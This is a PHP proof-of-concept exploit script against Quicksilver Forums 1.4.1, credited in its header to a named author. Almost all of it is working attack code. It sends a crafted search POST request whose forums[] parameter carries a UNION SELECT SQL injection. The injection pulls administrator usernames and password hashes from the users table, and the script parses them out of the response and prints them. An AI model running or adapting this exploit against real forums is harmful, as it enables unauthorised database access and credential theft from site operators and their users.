&lt;?php
/*
. vuln.: Quicksilver Forums 1.4.1 (forums[]) Remote SQL Injection Exploit
. download: http://www.quicksilverforums.com/
.
. author: irk4z[at]yahoo.pl
. homepage: http://irk4z.wordpress.com/
.
. greets: all friends ;)
.
. this is PoC exploit
*/

$host = $argv[1];
$path = $argv[2];
$prefix = &quot;qsf_&quot;; // this is default prefix

echo
&quot;.\n. Quicksilver Forums 1.4.1 (forums[]) Remote SQL Injection Exploit\n.\n&quot;.
&quot;. author: irk4z[at]yahoo.pl\n&quot;.
&quot;. homepage: http://irk4z.wordpress.com/\n&quot;.
&quot;.\n&quot;.
&quot;. usage: php &quot;.$argv[0].&quot; host path\n&quot;.
&quot;.        php &quot;.$argv[0].&quot; localhost /\n\n&quot;;

if(empty($host)||empty($path))die(&#039;# wrong host or path..&#039;);

$post_data = &quot;query=I-like-it&amp;forums[]=2)/**/limit/**/0/**/UNION/**/SELECT/**/1,1,concat(0x5b3a213a5d,user_name,0x3A,user_password,0x5b3a213a5d),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1/**/FROM/**/&quot;.$prefix.&quot;users/**/WHERE/**/user_group=1/*&amp;searchtype=match&amp;member_text=&amp;member_select=exact&amp;showposts_check=on&amp;limit_check=on&amp;limit_chars=400&amp;time_check=on&amp;time_way_select=newer&amp;time_select=31&amp;submit=Search&quot;;

$data = &quot;POST &quot;.$path.&quot;index.php?a=search HTTP/1.1\r\n&quot;;
$data .= &quot;Host: &quot;.$host.&quot;\r\n&quot;;
$data .= &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
$data .= &quot;Content-length: &quot;.strlen($post_data).&quot;\r\n&quot;;
$data .= &quot;Connection: Close\r\n&quot;;
$data .= &quot;\r\n&quot;;
$data .= $post_data.&quot;\r\n\r\n&quot;;

$s = @fsockopen($host, 80);
if (empty($s)) die(&#039;# wrong host..&#039;);

fputs($s, $data); $retu =&#039;&#039;;

while(!feof($s)){
	$retu .= fgets($s);
}

fclose($s);

$tmp = explode(&#039;[:!:]&#039;,$retu);
if(empty($tmp[1]))die(&#039;sorry, exploit failed.. maybe try again in a few seconds..&#039;);
echo &quot; &quot; . $tmp[1] . &quot;\n\ndone.&quot;;
?&gt;

